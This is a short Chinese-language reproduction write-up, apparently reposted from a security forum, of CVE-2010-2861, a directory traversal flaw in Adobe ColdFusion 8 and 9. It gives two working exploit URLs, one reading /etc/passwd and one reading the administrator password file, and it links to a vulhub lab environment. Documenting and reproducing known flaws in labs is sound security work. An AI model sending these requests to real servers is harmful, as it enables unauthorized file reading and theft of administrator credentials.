# （CVE-2010-2861）Adobe ColdFusion 文件读取漏洞

> 原文：[https://www.zhihuifly.com/t/topic/2805](https://www.zhihuifly.com/t/topic/2805)

# （CVE-2010-2861）Adobe ColdFusion 文件读取漏洞

## 一、漏洞简介

Adobe ColdFusion 8、9版本中存在一处目录穿越漏洞，可导致未授权的用户读取服务器任意文件。

## 二、漏洞影响

Adobe ColdFusion 8

Adobe ColdFusion 9

## 三、复现过程

直接访问`http://www.0-sec.org:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../../../../etc/passwd%00en`，即可读取文件`/etc/passwd`：

![image](img/309c8fe11ad9310ce57bbd1487257533.png)

读取后台管理员密码`http://www.0-sec.org:8500/CFIDE/administrator/enter.cfm?locale=../../../../../../../lib/password.properties%00en`：

![image](img/9493648f6d2b241211cf9b841c79d04d.png)

## 参考链接

> https://vulhub.org/#/environments/coldfusion/CVE-2010-2861/